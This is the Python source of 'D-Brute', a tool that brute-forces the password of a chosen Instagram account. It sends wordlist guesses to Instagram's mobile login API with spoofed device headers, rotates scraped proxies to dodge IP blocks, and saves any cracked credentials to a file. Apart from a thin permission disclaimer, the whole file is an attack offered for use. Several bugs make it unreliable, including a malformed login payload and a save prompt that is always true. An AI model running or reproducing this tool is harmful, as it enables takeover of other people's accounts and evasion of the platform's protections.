#!/bin/python
#
#    D-Brute   by Coding With Devil  https://www.youtube.com/c/CodingWithDevil/
#    This program comes with ABSOLUTELY NO WARRANTY
#    The use of the D-Brute & its resources is COMPLETE RESPONSIBILITY of the END-USER.
#    Developers assume NO liability and are NOT responsible for any damage caused by this program.
#    Also we want to inform you that some of your actions may be ILLEGAL and you CAN NOT use this
#    software to test device, company or any other type of target without WRITTEN PERMISSION from them.

from Defs.manager.cmdmanager import *
import requests as rqs
from time import sleep
import random
import threading
import json
from requests.adapters import HTTPAdapter
try:
    import Queue
except ImportError:
    import queue as Queue   
import Defs.Theme.Dbrute as dtheme 
import Defs.dscraper.D_scraper as scraper 

def main():
    global uname
    
    run_command("clear")

    print(dtheme.logo)

    print("\033[1;32m Instagram Username :- \n ")
    uname = input(dtheme.asker)
    print("   ")
    print("\033[1;32m Password list path:-")
    print(" ")
    passwd = input(dtheme.asker)
    
    
    print(" ")
    print("\033[1;32m Do You want to use inbuild proxy-scrapper y/n \n")
    t1 = input(dtheme.asker)
    option = t1
    p_option = option.zfill(1)
    
    if p_option == "y" :
        print(" ")
        print("\033[1;31m Grabing Proxy Please Wait \n" )
        scraper.dscraper_http()
        wait(3)
        p1 = open("output.txt", "r").readlines()
        wait(1)
        scraper.dscraper_https()
        open("output.txt", "a").writelines(p1)
        tp = len(open("output.txt").readlines())
        print(f"\033[1;33m Total Proxys {tp}")
        n = int(tp)
        sleep(5)
        proxys = open("output.txt").readlines()
        check_proxys(proxys, n)
        print("\033[1;33m Proxy Checking Finished \n")
        print(" ")
        wps = len(open('working_proxy.txt').readlines)
        print(f"\033[1;32m Total Working Proxy : {wps} \n")
        words = open(passwd).readlines()
        w = int(len(words))
        print(" ")
        print(f"\033[1;33m Total Passwords in List {w} \n")
        wait(5)
        wn = w//4
        
        starter_runner(wn, words)
    
    elif p_option == "n" :
        print(" ")
        print("\033[1;32m proxy list path : \n")
        p_path = input(dtheme.asker)
        proxys = open(p_path).readlines()
        n = int(len(proxys))
        print(' ')
        print(f"\033[1;33m Total Proxys in List : {n}\n")
         
        check_proxys(proxys, n)
        print("\033[1;33m Proxy Checking Finished \n")
        print(" ")
        wps = len(open('working_proxy.txt').readlines())
        print(f"\033[1;32m Total Working Proxy : {wps} \n")
        words = open(passwd).readlines()
        w = int(len(words))
        print(" ")
        print(f"\033[1;33m Total Passwords in List {w} \n")
        wait(5)
        wn = w//4
       
        starter_runner(wn, words)
      
    else :
        print("\033[1;31m Please Chose a valid option\n")
        main()
    
    
    

    sleep(3)
    exit()
    



def check_proxy(q):

    if not q.empty():

        proxy = q.get(False)
        proxy = proxy.replace("\r", "").replace("\n", "")

        try:
            
            proxys = {
                "http": "http://" + proxy,
                "https": "http://" + proxy
            }

            header = {'User-Agent': random.choice(user_agents)}
            url = 'https://api.ipify.org/'
            s = rqs.Session()
            s.headers.update(header)
            r = s.get(url, proxies=proxys,timeout=300)
            if r.text == proxy.partition(':')[0]:
                with open('working_proxy.txt' , 'a') as f:
                    f.writelines("".join(proxy) + "\n" )
               
                print( "\033[1;32m --[+] ", proxy, " | PASS \n" )
                
            else:
                
                print("\033[1;31m --[!] ", proxy, " | FAILED\n")
        except rqs.Timeout :
            print("\033[1;31m --[!] %s  | FAILED \n" %(proxy))
        except rqs.HTTPError as e :
            
            print("\033[1;31m --[!] %s  | FAILED \n" %(proxy))
        except Exception as err:
            
            print("\033[1;31m --[!] %s  | FAILED \n" %(proxy))
            
            pass
            return
def check_proxys(proxys, n):
 

    queue = Queue.Queue()
    queuelock = threading.Lock()
    threads = []

    for proxy in proxys:
        queue.put(proxy)
   
    while not queue.empty():
        queuelock.acquire()
        for workers in range(n):
            t = threading.Thread(target=check_proxy, args=(queue,))
            t.setDaemon(True)
            t.start()
            threads.append(t)
        for t in threads:
            t.join()
        queuelock.release()


    

def brute(passwd,bproxy):

    if not passwd.empty():

        word = passwd.get()
        word = word.replace("\r", "").replace("\n", "")
        proxy = bproxy
        proxys = {
                "http": "http://" + proxy,
                "https": "http://" + proxy
        }
        
        brute_url = "https://i.instagram.com/api/v1/accounts/login/"
        customHeaders = {("User-Agent", "Instagram 27.0.0.11.97 Android (25/7.1.1; 480dpi; 1080x1776; motorola; Moto G (5S) Plus; sanders_nt; qcom; pt_BR)")}
        data = {
            "signed_body=31029288e4960f4e7d6dec4f8cda454a334d106611d3e67cf9e60016c1ac5d39.{""adid":"f37b8bcc-ae55-4fc8-8896-9205eaa39ecf", 
            "country_codes":"[{country_code"':'"1",
            "source":"[""defaul""]}]", 
            "device_id":"android-8a9b78d8b48647df",
            "google_tokens":"[]","guid":"b1f5bdbe-4bc3-4962-b5e8-c82825d4e79c",
            "login_attempt_count":"0",
            "password":f"{word}",
            "phone_id":"1549b080-f879-43a8-a653-cc60d6b9598a",
            "username":f"{uname}"}

        s = rqs.session()
        s.mount(brute_url, HTTPAdapter(max_retries=7))
        s.proxies.update(proxys)
        s.headers.update(customHeaders)
        print("\033[1;31m Trying Password: %s | Proxy: %s \n"%(word,proxy))
        try :
            r = s.post(brute_url , data=data, allow_redirects=True, timeout=300 )
            res  = json.loads(r.text)
            try :
                print(res)
            except Exception:
                pass
            try:
                if res["error_type"]=="bad_password":
                    print("\033[1;31m worng Password: %s \n"%(word))
                elif res["error_type"]=="ip_block":
                    print("\033[1;31m Ip Blocked Removing Ip from the list \n")
                    print("Proxy Error | %s |.. Removing Proxy "%(proxy))
                    with open(r_list, "r") as f:
                        lines = f.readlines()
                    with open(r_list, "w") as f:
                        for line in lines:
                            if line.strip("\n") != proxy:
                                f.write(line)
                                return proxy

                elif res["error_type"]=="invalid_user":
                    print("\033[1;31m Exiting.... Invalid username \n")
                    exit()
                else:
                    pass   
            except Exception:
                    pass
            try:
                if res["challenge"]:
                    run_command("clear")
                    print(dtheme.logo)
                    print("""
                        
                        
                    """)
                    funame = "[!] username : %s"%(uname)
                    unamelen = len(funame)
                    fpasswd = "[!] Password : %s"%(word)
                    passwdlen = len(fpasswd)
                    if unamelen > passwdlen:
                        lenth = unamelen + 8 
                    elif passwdlen > unamelen:
                        lenth =  passwdlen + 8 
                    B = "D-Brute"
                    blen= len(B)
                    tlen = ((lenth - blen)-4)//2
                    uspacelen = lenth - (unamelen + 4 )
                    pspacelen = lenth - (passwdlen + 4)
                    print("\033[1;34m Brute Complete :")
                    print(" ")
                    print("\033[1;33m +" + tlen * "-" +"<-\033[1;34m"+ B + "\033[1;33m->" +tlen * "-" + "+" )
                    print("\033[1;33m D" + lenth * " " + "D" )
                    print("\033[1;33m B" + 4 * " " +"\033[1;32m" + funame + uspacelen * " " + "\033[1;33mB")
                    print("\033[1;33m R" + lenth * " " + "R" )
                    print("\033[1;33m U" + lenth * " " + "U" )
                    print("\033[1;33m T" + 4 * " " + "\033[1;31m" + fpasswd + pspacelen *  " " + "\033[1;33mT")
                    print("\033[1;33m E" + lenth * " " + "E" )
                    print("\033[1;33m +" + tlen * "-" +"<-\033[1;34m"+ B + "\033[1;33m->" +tlen * "-" + "+" )
                    print(" ")
                    print("\033[1;32m But Checkpoint Challenge Required \n")
                    result = input("\033[1;31mDo you want to Save Result [\033[1;32mdefault saving Location : Result/result.txt] Y/n: \033[1;34m")
                    if result == "y" or "Y":
                        with open("result/result.txt", 'a') as r:
                            r.writelines("".join(funame) + "\n" )
                            r.writelines("".join(fpasswd) + "\n" )
                    else :
                        pass
                    found_flag = True
                    passwd.queue.clear()
                    passwd.task_done()
                    exit()

            except Exception:
                pass

            try:
                if res["logged_in_user"]:
                    run_command("clear")
                    print(dtheme.logo)
                    print("""
                        
                        
                    """)
                    funame = "[!] username : %s"%(uname)
                    unamelen = len(funame)
                    fpasswd = "[!] Password : %s"%(word)
                    passwdlen = len(fpasswd)
                    if unamelen > passwdlen:
                        lenth = unamelen + 8 
                    elif passwdlen > unamelen:
                        lenth =  passwdlen + 8 
                    B = "D-Brute"
                    blen= len(B)
                    tlen = ((lenth - blen)-4)//2
                    uspacelen = lenth - (unamelen + 4 )
                    pspacelen = lenth - (passwdlen + 4)
                    print("\033[1;34m Brute Complete :")
                    print(" ")
                    print("\033[1;33m +" + tlen * "-" +"<-\033[1;34m"+ B + "\033[1;33m->" +tlen * "-" + "+" )
                    print("\033[1;33m D" + lenth * " " + "D" )
                    print("\033[1;33m B" + 4 * " " +"\033[1;32m" + funame + uspacelen * " " + "\033[1;33mB")
                    print("\033[1;33m R" + lenth * " " + "R" )
                    print("\033[1;33m U" + lenth * " " + "U" )
                    print("\033[1;33m T" + 4 * " " + "\033[1;31m" + fpasswd + pspacelen *  " " + "\033[1;33mT")
                    print("\033[1;33m E" + lenth * " " + "E" )
                    print("\033[1;33m +" + tlen * "-" +"<-\033[1;34m"+ B + "\033[1;33m->" +tlen * "-" + "+" )
                    print(" ")
                    print("\033[1;32m But Checkpoint Challenge Required \n")
                    result = input("\033[1;31mDo you want to Save Result [\033[1;32mdefault saving Location : Result/result.txt] Y/n: \033[1;34m")
                    if result == "y" or "Y":
                        with open("result/result.txt", 'a') as r:
                            r.writelines("".join(funame) + "\n" )
                            r.writelines("".join(fpasswd) + "\n" )
                    else :
                        pass
                    found_flag = True
                    passwd.queue.clear()
                    passwd.task_done()
                    exit()

                    
                else:
                    pass
            except Exception:
                pass

           
                

        except Exception:
            print("unknown error ")
            return proxy
        
        
def starter_runner(wn, words):
   
    global found_flag

    passwd = Queue.Queue()
    queuelock = threading.Lock()
    threads = []
    found_flag = False
    
   
    lines = open(r_list).read().splitlines()
    proxy = random.choice(lines)
    
    try :
    
        proxys = {
                    "http": "http://" + proxy,
                    "https": "http://" + proxy
            }
        header = {'User-Agent': random.choice(user_agents)}
        url = 'https://api.ipify.org/'
        s = rqs.Session()
        s.headers.update(header)
        s.mount(url, HTTPAdapter(max_retries=7))
        r = s.get(url, proxies=proxys,timeout=300)
        if r.status_code ==200 :
            try :
                
                bproxy = proxy
                for word in words:
                    passwd.put(word)
                
                
                while not passwd.empty():
                    queuelock.acquire()
                    for workers in range(wn):
                        t = threading.Thread(target=brute, args=(passwd,bproxy))
                        t.setDaemon(True)
                        t.start()
                        threads.append(t)
                    for t in threads:
                        t.join()
                    queuelock.release() 
                    if found_flag:
                        break
                print("\033[1;33m [!] Brute complete !")
            except Exception as er:
                print(er)
        else:
            print("proxy Failed")
    except Exception:
        print("Proxy Error | %s |.. Removing Proxy "%(proxy))
        with open(r_list, "r") as f:
            lines = f.readlines()
        with open(r_list, "w") as f:
            for line in lines:
                if line.strip("\n") != proxy:
                    f.write(line)
                    return proxy


        
if __name__ == "__main__":
    try:
        user_agents = ["Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0)",
                    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_2) AppleWebKit/537.36 (KHTML, like Gecko)",
                    "Mozilla/5.0 (Linux; U; Android 2.3.5; en-us; HTC Vision Build/GRI40) AppleWebKit/533.1",
                    "Mozilla/5.0 (iPad; CPU OS 6_0 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko)",
                    "Mozilla/5.0 (Windows; U; Windows NT 6.1; rv:2.2) Gecko/20110201",
                    "Mozilla/5.0 (Windows NT 5.1; rv:31.0) Gecko/20100101 Firefox/31.0",
                    "Mozilla/5.0 (Windows; U; MSIE 9.0; WIndows NT 9.0; en-US))"]
        default_list = "output.txt"
        lists = "output.txt"
        r_list = "working_proxy.txt"
        
        open(r_list, 'w').close()
        main()

        

    except KeyboardInterrupt:
        exit()
    finally :
        print(dtheme.endscreen)






